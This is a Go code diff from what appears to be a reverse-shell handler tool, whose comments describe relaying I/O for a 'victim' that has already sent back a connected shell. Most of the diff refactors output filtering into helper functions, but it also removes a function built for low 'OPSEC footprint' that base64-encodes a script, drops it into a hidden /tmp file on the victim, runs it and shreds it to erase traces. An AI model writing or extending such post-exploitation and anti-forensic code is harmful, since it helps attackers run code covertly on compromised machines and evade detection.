@@ -2,7 +2,6 @@ package internal
 
 import (
 	"context"
-	"encoding/base64"
 	"fmt"
 	"io"
 	"net"
@@ -20,15 +19,15 @@ import (
 // Handler gerencia uma sessão de reverse shell
 // A vítima já enviou uma shell conectada, nós fazemos relay do I/O
 type Handler struct {
-	conn           net.Conn      // Conexão com a vítima (que já tem shell rodando)
-	sessionID      string        // ID da sessão para logs
-	originalTerm   *term.State   // Estado original do terminal para restaurar
-	onClose        func(string)  // Callback quando conexão fechar
-	platform       string        // Platform detected ("windows", "linux", "unknown")
-	ptyUpgrader    *PTYUpgrader  // PTY upgrader (for resize handler cleanup)
-	logWriter      *os.File      // Optional log file for session I/O
-	viewportCols   int           // Override PTY cols for TUI mode (0 = auto)
-	viewportRows   int           // Override PTY rows for TUI mode (0 = auto)
+	conn         net.Conn     // Conexão com a vítima (que já tem shell rodando)
+	sessionID    string       // ID da sessão para logs
+	originalTerm *term.State  // Estado original do terminal para restaurar
+	onClose      func(string) // Callback quando conexão fechar
+	platform     string       // Platform detected ("windows", "linux", "unknown")
+	ptyUpgrader  *PTYUpgrader // PTY upgrader (for resize handler cleanup)
+	logWriter    *os.File     // Optional log file for session I/O
+	viewportCols int          // Override PTY cols for TUI mode (0 = auto)
+	viewportRows int          // Override PTY rows for TUI mode (0 = auto)
 }
 
 // NewHandler cria um novo handler para reverse shell
@@ -672,15 +671,7 @@ func (h *Handler) ExecuteWithStreamingCtx(ctx context.Context, cmd, localOutputP
 			accumulated.WriteString(chunk)
 
 			// Filter out the marker and echo command from output file
-			cleanChunk := chunk
-			if strings.Contains(cleanChunk, marker) {
-				cleanChunk = strings.ReplaceAll(cleanChunk, marker, "")
-			}
-			if strings.Contains(cleanChunk, "echo '"+marker+"'") {
-				cleanChunk = strings.ReplaceAll(cleanChunk, "echo '"+marker+"'", "")
-			}
-			// Remove leftover blank lines from filtering
-			cleanChunk = strings.ReplaceAll(cleanChunk, "\n\n\n", "\n\n")
+			cleanChunk := filterStreamingChunk(chunk, marker)
 			if cleanChunk != "" {
 				localFile.WriteString(cleanChunk)
 				localFile.Sync()
@@ -707,82 +698,53 @@ func (h *Handler) ExecuteWithStreamingCtx(ctx context.Context, cmd, localOutputP
 	return nil
 }
 
-// ExecuteScriptFromStdin executes script with minimal OPSEC footprint
-// Uses /tmp/ briefly (file exists for ~seconds), but gives clean output
-func (h *Handler) ExecuteScriptFromStdin(interpreter, args string, scriptData []byte, localOutputPath string) error {
-	// Create local output file
-	localFile, err := os.Create(localOutputPath)
-	if err != nil {
-		return fmt.Errorf("failed to create local file: %w", err)
+func filterStreamingChunk(chunk, marker string) string {
+	cleanChunk := chunk
+	if strings.Contains(cleanChunk, marker) {
+		cleanChunk = strings.ReplaceAll(cleanChunk, marker, "")
 	}
-	defer localFile.Close()
-
-	// Use /tmp/ with hidden filename
-	tempFile := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
-	doneMarker := fmt.Sprintf("__GUMMY_DONE_%d__", time.Now().UnixNano())
-
-	// Base64 encode to avoid any escaping issues
-	scriptB64 := base64.StdEncoding.EncodeToString(scriptData)
-
-	// Single line: decode to temp, execute, shred/delete
-	// This is clean, works reliably, and file exists briefly
-	fullCmd := fmt.Sprintf("echo %s|base64 -d>%s;%s %s%s;shred -uz %s 2>/dev/null||rm -f %s;echo %s\n",
-		scriptB64, tempFile, interpreter, tempFile, args, tempFile, tempFile, doneMarker)
-
-	_, err = h.conn.Write([]byte(fullCmd))
-	if err != nil {
-		return fmt.Errorf("failed to send command: %w", err)
+	if strings.Contains(cleanChunk, "echo '"+marker+"'") {
+		cleanChunk = strings.ReplaceAll(cleanChunk, "echo '"+marker+"'", "")
 	}
 
-	// Read output in real-time until done marker
-	buffer := make([]byte, 4096)
-	var accumulated strings.Builder
-	h.conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
+	cleanChunk = stripTrailingPromptOnlyLine(cleanChunk)
+	cleanChunk = strings.ReplaceAll(cleanChunk, "\n\n\n", "\n\n")
+	return cleanChunk
+}
 
-	for {
-		n, err := h.conn.Read(buffer)
-		if err != nil {
-			if err == io.EOF {
-				break
-			}
-			if accumulated.Len() > 0 && strings.Contains(accumulated.String(), doneMarker) {
-				break
-			}
-			return fmt.Errorf("read error: %w", err)
-		}
-
-		if n > 0 {
-			chunk := string(buffer[:n])
-			accumulated.WriteString(chunk)
-
-			// Write to local file immediately
-			localFile.WriteString(chunk)
-			localFile.Sync()
-
-			// Check for done marker
-			if strings.Contains(accumulated.String(), doneMarker) {
-				break
-			}
-		}
+func stripTrailingPromptOnlyLine(s string) string {
+	trimmedNewline := strings.TrimRight(s, "\n")
+	if trimmedNewline == "" {
+		return s
 	}
 
-	h.conn.SetReadDeadline(time.Time{})
-
-	// Clean output (remove done marker and shell noise)
-	finalContent := accumulated.String()
-
-	// Remove done marker
-	markerIndex := strings.Index(finalContent, doneMarker)
-	if markerIndex != -1 {
-		finalContent = finalContent[:markerIndex]
+	lastNL := strings.LastIndex(trimmedNewline, "\n")
+	line := trimmedNewline
+	prefix := ""
+	if lastNL >= 0 {
+		prefix = trimmedNewline[:lastNL+1]
+		line = trimmedNewline[lastNL+1:]
 	}
 
-	// Don't rewrite the file - leave raw output intact
-	// This prevents tail -f from showing duplicate content when file is truncated
-	// User can see raw output in real-time via tail -f in separate terminal
-	// If they want clean output later, they can manually clean it or use cat
+	line = strings.TrimRight(line, " ")
+	if isPromptOnlyLine(line) {
+		return prefix
+	}
+	return s
+}
 
-	return nil
+func isPromptOnlyLine(line string) bool {
+	line = strings.TrimSpace(line)
+	if line == "" {
+		return false
+	}
+	if strings.HasPrefix(line, "PS ") && strings.HasSuffix(line, ">") {
+		return true
+	}
+	if strings.HasSuffix(line, "$") || strings.HasSuffix(line, "#") || strings.HasSuffix(line, "%") {
+		return true
+	}
+	return false
 }
 
 // GetConnection returns the underlying connection
